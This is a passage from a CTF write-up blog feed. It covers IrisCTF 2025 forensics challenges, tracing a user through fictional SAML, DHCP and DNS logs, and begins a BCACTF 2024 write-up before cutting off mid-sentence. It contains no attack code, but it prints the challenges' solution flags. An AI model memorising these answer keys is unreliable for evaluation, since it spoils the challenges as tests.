Edge/16.16299|https://sso.evil-insurance.corp/ns/profiles/saml2/sso/browser|llloyd||uid|service.evil-insurance.corp|https://sso.evil-insurance.corp/idp/sso|url:oasis:names:tc:SAML:2.0:protocol|urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect|urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST|kzYQV+Jk2w3KkwmRjR+HK4QWVQ3qzLPLgA5klV2b8bQT+NLYLeqCZw5xUGKbx1U1158jlnUYRrILtVTtMkMdbA==|urn:oasis:names:tc:SAML:2.0:nameid-format:transient|_60b0fd4b0ed5bba3474faeb85b3944e|2024-12-04 04:58:35.622504|_c4b56d58-625b-49aa-b859-4a2068422979||||urn:oasis:names:tc:SAML:2.0:status:Success|||false|false|true&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-12-04 04:58:35.622504&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;NLYLeqCZw5xUGKbx1U1158jlnUYRrILtVTtMkMdbA&quot;</span><span class="punctuation">:</span> <span class="string">&quot;=|urn:oasis:names:tc:SAML:2.0:nameid-format:transient|_60b0fd4b0ed5bba3474faeb85b3944e|2024-12-04&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>I then checked the syslog for this IP address and found the name of the employee associated with it: <code>llloyd</code>.</p><h5 id="Creating-the-Flag-7"><a href="#Creating-the-Flag-7" class="headerlink" title="Creating the Flag"></a>Creating the Flag</h5><p>With the gathered information, I constructed the flag using the defined format, and boom, that was the correct flag.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;llloyd&#125;</span></span><br></pre></td></tr></table></figure><h3 id="Tracem2"><a href="#Tracem2" class="headerlink" title="Tracem2"></a>Tracem2</h3><h4 id="Challenge-Description-11"><a href="#Challenge-Description-11" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2025-irisctf/forensics/tracem2/desc.png" alt="Description"></p><p>Source File: <a href="/images/posts/2025-irisctf/forensics/tracem2/tracem-2.tar.gz">tracem-2.tar.gz</a></p><p>Yeah some of the teams had 600+ and 1300+ attempts.😂</p><h4 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h4><p>This challenge is a continuation of the Tracem1 challenge. For better context, you can refer to my Tracem1 write-up. Unfortunately, I was only able to solve this challenge partially during the CTF duration 🥹. I delved too deeply into analysis and missed a critical clue. However, I’ll share all the data and steps I took while solving it.</p><h5 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview"></a>Challenge Overview</h5><p>We received a logs.json file for this challenge. Similar to Tracem1, I began analyzing the logs.</p><p>Here are some notable sites accessed in the logs.json file:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">detectportal.firefox.com</span></span><br><span class="line"><span class="string">www.msftconnecttest.com</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="number">3.</span><span class="string">fedora.pool.ntp.org</span></span><br><span class="line"><span class="number">0.</span><span class="string">arch.pool.ntp.org</span></span><br><span class="line"><span class="string">globo.com</span></span><br><span class="line"><span class="string">reg.ru</span></span><br><span class="line"><span class="number">1.</span><span class="string">ubuntu.pool.ntp.org</span></span><br><span class="line"><span class="string">politico.com</span></span><br><span class="line"><span class="string">enable-javascript.com</span></span><br><span class="line"><span class="string">mozilla.com</span></span><br><span class="line"><span class="string">fb.me</span></span><br><span class="line"><span class="string">20minutos.es</span></span><br><span class="line"><span class="string">last.fm</span></span><br><span class="line"><span class="string">xda-developers.com</span></span><br><span class="line"><span class="string">unicef.org</span></span><br><span class="line"><span class="string">nypost.com</span></span><br><span class="line"><span class="string">target.com</span></span><br><span class="line"><span class="string">kickstarter.com</span></span><br><span class="line"><span class="number">2.</span><span class="string">arch.pool.ntp.org</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">gitlab.evil-insurance.corp</span></span><br><span class="line"><span class="string">hr.evil-insurance.corp</span></span><br><span class="line"><span class="string">files.evil-insurance.corp</span></span><br><span class="line"><span class="string">meetings.evil-insurance.corp</span></span><br><span class="line"><span class="string">it.evil-insurance.corp</span></span><br><span class="line"><span class="string">evil-insurance.corp</span></span><br><span class="line"><span class="string">chat.evil-insurance.corp</span></span><br><span class="line"><span class="string">service.evil-insurance.corp</span></span><br><span class="line"><span class="string">guestportal.evil-insurance.corp</span></span><br><span class="line"><span class="string">sso.evil-insurance.corp</span></span><br><span class="line"><span class="string">evil-insurance.corp</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">ubuntu.com</span></span><br><span class="line"><span class="string">thepiratebay.org</span></span><br><span class="line"><span class="string">generic-illicit-activities-hub.org</span></span><br><span class="line"><span class="string">deloitte.com</span></span><br><span class="line"><span class="string">bp0.blogger.com</span></span><br></pre></td></tr></table></figure><p>These two sites seemed suspicious:</p><ul><li>thepiratebay.org</li><li>generic-illicit-activities-hub.org</li></ul><p>I then identified the user who accessed both sites:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ strings logs.json | grep -E <span class="string">&quot;thepiratebay.org|generic-illicit-activities-hub.org&quot;</span></span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 08:51:51.12&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 08:51:51.092921&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 48851, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 119, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;thepiratebay.org&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 08:51:51.13&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 08:51:51.102210&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 2975, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 13007, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;thepiratebay.org&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 08:51:53.22&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 08:51:52.449001&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 48851, <span class="string">&quot;transaction_id&quot;</span>: 119, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;thepiratebay.org&quot;</span>, <span class="string">&quot;addr&quot;</span>: <span class="string">&quot;104.16.148.244&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 08:51:53.22&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 08:51:52.450021&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 2975, <span class="string">&quot;transaction_id&quot;</span>: 13007, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;thepiratebay.org&quot;</span>, <span class="string">&quot;addr&quot;</span>: null&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 09:05:01.12&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 09:05:00.400067&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 22066, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 2835, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;generic-illicit-activities-hub.org&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 09:05:00.70&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 09:05:00.520979&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 64559, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 53, <span class="string">&quot;transaction_id&quot;</span>: 3019, <span class="string">&quot;queries&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;generic-illicit-activities-hub.org&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 09:05:01.76&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 09:05:01.197568&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 22066, <span class="string">&quot;transaction_id&quot;</span>: 2835, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;A&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;generic-illicit-activities-hub.org&quot;</span>, <span class="string">&quot;addr&quot;</span>: <span class="string">&quot;96.16.243.221&quot;</span>&#125;]&#125;&#125;</span><br><span class="line">&#123;<span class="string">&quot;host&quot;</span>: <span class="string">&quot;primary&quot;</span>, <span class="string">&quot;source&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;sourcetype&quot;</span>: <span class="string">&quot;stream:dns&quot;</span>, <span class="string">&quot;_time&quot;</span>: <span class="string">&quot;2024-12-04 09:05:01.72&quot;</span>, <span class="string">&quot;data&quot;</span>: &#123;<span class="string">&quot;timestamp&quot;</span>: <span class="string">&quot;2024-12-04 09:05:01.201187&quot;</span>, <span class="string">&quot;protocol_stack&quot;</span>: <span class="string">&quot;ip:udp:dns&quot;</span>, <span class="string">&quot;transport&quot;</span>: <span class="string">&quot;udp&quot;</span>, <span class="string">&quot;src_ip&quot;</span>: <span class="string">&quot;10.18.0.2&quot;</span>, <span class="string">&quot;src_port&quot;</span>: 53, <span class="string">&quot;dest_ip&quot;</span>: <span class="string">&quot;10.18.21.121&quot;</span>, <span class="string">&quot;dest_port&quot;</span>: 64559, <span class="string">&quot;transaction_id&quot;</span>: 3019, <span class="string">&quot;answers&quot;</span>: [&#123;<span class="string">&quot;type&quot;</span>: <span class="string">&quot;AAAA&quot;</span>, <span class="string">&quot;class&quot;</span>: <span class="string">&quot;IN&quot;</span>, <span class="string">&quot;name&quot;</span>: <span class="string">&quot;generic-illicit-activities-hub.org&quot;</span>, <span class="string">&quot;addr&quot;</span>: null&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure><h5 id="Suspicious-User-Identification"><a href="#Suspicious-User-Identification" class="headerlink" title="Suspicious User Identification"></a>Suspicious User Identification</h5><p>The suspicious user had the following attributes:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">IP Address: 10.18.21.121</span><br><span class="line">MAC Address: de:ad:be:ef:ca:fe (a spoofed address)</span><br></pre></td></tr></table></figure><h6 id="Activity-Timeline-of-the-Suspicious-User"><a href="#Activity-Timeline-of-the-Suspicious-User" class="headerlink" title="Activity Timeline of the Suspicious User"></a>Activity Timeline of the Suspicious User</h6><table><thead><tr><th>Event</th><th>Time of the event</th></tr></thead><tbody><tr><td>Req for the addr 10.18.21.121</td><td>2024-12-04 08:49:20.52</td></tr><tr><td>Get assigned that addr</td><td>2024-12-04 08:49:21.00</td></tr><tr><td>Access <a href="http://www.google.com/">www.google.com</a></td><td>2024-12-04 08:49:34.58</td></tr><tr><td>Access 2.arch.pool.ntp.org</td><td>2024-12-04 08:51:18.72</td></tr><tr><td>Access thepiratebay.org</td><td>2024-12-04 08:51:51.12</td></tr><tr><td>Access generic-illicit-activities-hub.org</td><td>2024-12-04 09:05:01.12</td></tr><tr><td>Releases the IP addr</td><td>2024-12-04 09:22:01.12</td></tr></tbody></table><p>This was another challenge in the Tracem series, so it wasn’t going to be straightforward to solve via syslog logs. Additionally, the suspicious IP (10.18.21.121) didn’t have any corresponding syslog logs, making direct identification of the user more difficult.</p><p>Since I had already established that the suspicious IP (10.18.21.121) was the only one to access the two suspicious sites (thepiratebay.org and generic-illicit-activities-hub.org), I decided to investigate further.</p><p>To narrow down potential leads, I began analyzing who else accessed 2.arch.pool.ntp.org.</p><p>I got these result:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">10.50.103.29</span><br><span class="line">10.66.91.95</span><br><span class="line">10.66.68.75</span><br><span class="line">10.17.161.10</span><br><span class="line">10.34.192.28</span><br><span class="line">10.65.26.90</span><br><span class="line">10.65.68.160</span><br><span class="line">10.51.64.145</span><br><span class="line">10.66.156.255</span><br><span class="line">10.35.126.228</span><br><span class="line">10.67.252.116</span><br><span class="line">10.17.6.47</span><br><span class="line">10.50.184.143</span><br><span class="line">10.18.21.121</span><br><span class="line">10.49.220.32</span><br><span class="line">10.49.79.62</span><br><span class="line">10.49.65.21</span><br><span class="line">10.17.90.14</span><br><span class="line">10.17.26.247</span><br><span class="line">10.17.171.253</span><br><span class="line">10.65.228.127</span><br></pre></td></tr></table></figure><h5 id="Initial-Misstep"><a href="#Initial-Misstep" class="headerlink" title="Initial Misstep"></a>Initial Misstep</h5><p>At this point, I noticed that the user accessed 2.arch.pool.ntp.org, a relatively common URL. I assumed it wasn’t suspicious and did not cross-reference other IPs that accessed this site during the same timeframe. This was my critical oversight.</p><p>Feel free to skip the rest if you’d like—I’ll now share what I explored after this step.</p><h5 id="Investigation-Details"><a href="#Investigation-Details" class="headerlink" title="Investigation Details"></a>Investigation Details</h5><h6 id="Extraction-and-Analysis"><a href="#Extraction-and-Analysis" class="headerlink" title="Extraction and Analysis"></a>Extraction and Analysis</h6><ol><li>MAC Addresses:</li></ol><p>I extracted all MAC addresses to look for other spoofed addresses but found no results.</p><ol start="2"><li>IP Segmentation:</li></ol><p>I identified recurring IP ranges in the logs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">10.17.X.X</span><br><span class="line">10.18.X.X</span><br><span class="line">10.19.X.X</span><br><span class="line">10.33.X.X</span><br><span class="line">10.34.X.X</span><br><span class="line">10.35.X.X</span><br><span class="line">10.49.X.X</span><br><span class="line">10.50.X.X</span><br><span class="line">10.51.X.X</span><br><span class="line">10.65.X.X</span><br><span class="line">10.66.X.X</span><br><span class="line">10.67.X.X</span><br></pre></td></tr></table></figure><ol start="3"><li>Syslog SSO Logs:</li></ol><p>Only the following IP ranges appeared in syslog SSO logs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">10.17.X.X</span><br><span class="line">10.19.X.X</span><br><span class="line">10.33.X.X</span><br><span class="line">10.35.X.X</span><br><span class="line">10.49.X.X</span><br><span class="line">10.51.X.X</span><br><span class="line">10.65.X.X</span><br><span class="line">10.67.X.X</span><br></pre></td></tr></table></figure><p>So it was certain that I would get the username from this set of IPs.</p><p>Looking at these IPs, I thought this challenge might be based on Network Segmentation. It appeared that there were four buildings and three subnets, which Skat later confirmed on Discord.</p><ol start="4"><li>Network Proximity Assumptions:</li></ol><p>I hypothesized that the suspicious user might have moved laterally to a new subnet, maintaining the same host&#x2F;octet structure.</p><p>From 10.17.X.X and 10.19.X.X:</p><ul><li>Likely Subnets: 10.17.21.xxx, 10.17.121.xxx, etc.</li><li>Likely Hosts: 10.17.x.121.</li></ul><p>Despite exploring these, I found no leads.</p><p>Then I moved on to checking the full logs.json file around the timeline of the IP guy. By this time, this challenge was my last one left, and I was very tired, so I couldn’t search properly.</p><h5 id="Aftermath"><a href="#Aftermath" class="headerlink" title="Aftermath"></a>Aftermath</h5><p>After the CTF Competition, Jakob (discord) mentioned that I should have checked the IPs accessing 2.arch.pool.ntp.org around the timeline of the suspicious user (10.18.21.121).😿</p><p><a href="https://team-bytesized.github.io/ctf/iris2025/writeups/tracem-2.html">Jakob’s Tracem2 Writeup</a></p><h6 id="Key-Table-from-Jakob’s-Write-Up"><a href="#Key-Table-from-Jakob’s-Write-Up" class="headerlink" title="Key Table (from Jakob’s Write-Up):"></a>Key Table (from Jakob’s Write-Up):</h6><table><thead><tr><th>Timestamp</th><th>Events</th><th>Notes</th></tr></thead><tbody><tr><td>2024-12-04 08:45:33.555166</td><td>10.17.161.10 ( mhammond ) disconnects from network</td><td>releases 10.17.161.10 + pause in traffic from 10.17.161.10</td></tr><tr><td>2024-12-04 09:42:00.907257</td><td>IP assignment to 10.17.161.10 ( mhammond )</td><td>traffic from 10.17.161.10 continues</td></tr></tbody></table><p>This IP (10.17.161.10) was the closest to the suspicious user’s timeline. The username associated with this IP was <code>mhammond</code>, making them the culprit.</p><p>Flag:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">irisctf&#123;mhammond&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h4><p>This challenge reinforced the importance of checking all data points and avoiding assumptions during investigations. Despite missing the critical clue during the competition, I gained valuable insights and improved my analysis techniques.<br>Thanks <code>skat</code> for the cool challenges.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;IrisCTF 2025!&lt;/p&gt;
&lt;p&gt;I participated in IrisCTF 2025, organized by IrisSec, as a member of the InfoSecIITR team. Our team secured an impre</summary>
      
    
    
    
    <category term="CTF-Writeups" scheme="https://g4rud4kun.github.io/categories/CTF-Writeups/"/>
    
    
    <category term="forensics" scheme="https://g4rud4kun.github.io/tags/forensics/"/>
    
    <category term="osint" scheme="https://g4rud4kun.github.io/tags/osint/"/>
    
    <category term="networking" scheme="https://g4rud4kun.github.io/tags/networking/"/>
    
    <category term="volatility" scheme="https://g4rud4kun.github.io/tags/volatility/"/>
    
  </entry>
  
  <entry>
    <title>BCACTF 5.0 2024</title>
    <link href="https://g4rud4kun.github.io/2024/06/12/BCACTF-5-0-2024/"/>
    <id>https://g4rud4kun.github.io/2024/06/12/BCACTF-5-0-2024/</id>
    <published>2024-06-12T12:38:29.000Z</published>
    <updated>2025-02-05T18:33:11.162Z</updated>
    
    <content type="html"><![CDATA[<p>BCACTF 5.0!</p><p>Returning for its fifth consecutive year, this high school CTF hosted by the Bergen County Academies offers challenges across various difficulty levels, catering to everyone from beginners to seasoned CTF veterans.</p><p>I had the opportunity to participate in BCACTF 2024 as a member of my institute’s club, InfoSecIITR. Our team secured 7th Place globally. These writeups document the challenges I personally solved during the competition. The remaining challenges were tackled by my teammates.</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a><em>Mysterious Melody</em></h3><h4 id="Challenge-Description"><a href="#Challenge-Description" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2024-bcactf/desc.png" alt="Description"></p><p>We have received a WAV file.</p><h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><p>So, I opened the WAV file using Sonic Visualizer software. Initially, I was unsure of what to do after examining the Spectrogram. Then, I analyzed the melody range spectrogram and the peak frequency spectrogram.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can add the Spectrogram, Melody Range Spectrogram, and Peak Frequency Spectrogram from the Pane menu.</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2024-bcactf/spec_melody.png" alt="Spectrogram"><br><img src="/images/posts/2024-bcactf/peak.png" alt="Peak"></p><p>Where I noticed something unusual that resembled Morse code, but it wasn’t. On the left side, there were 16 increasing lines, which matched the base16 hint provided. The hex values for the start of the flag ‘bcactf{‘ corresponded to the highs and lows of the lines on the right side. This clue confirmed it was part of the flag, and from there, we decoded all the highs and lows.</p><p><code>6263616374667B62656175746966756C5F6D656C6F64795F62656175746966756C5F6861726D6F6E797D</code></p><h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p><code>bcactf&#123;beautiful_melody_beautiful_harmony&#125;</code></p><h3 id="Static"><a href="#Static" class="headerlink" title="Static"></a><em>Static</em></h3><h4 id="Challenge-Description-1"><a href="#Challenge-Description-1" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p><img src="/images/posts/2024-bcactf/desc_static.png" alt="Desc"></p><p>We have received a MP4 file and the MD5 of a file.</p><h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>As the hints suggested, I began searching for the metadata.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool static.mp4</span><br><span class="line">Compressor Name                 : Lavc60.31.102 libx264rgb</span><br><span class="line">Encoder                         : StaticMaker https://shorturl.at/AUKZm</span><br></pre></td></tr></table></figure><p>Two things seemed sus to me: the Compressor and the Encoder. I then checked the above link for StaticMaker and realized they provided a documentation file with information about the StaticMaker software.</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">The StaticMaker ™ utility converts any binary file into a video, suitable for use in … some application somewhere, probably.</span><br><span class="line">The default configuration is width=256, height=256.</span><br><span class="line"></span><br><span class="line">The program works by:</span><br><span class="line">1. Compressing the 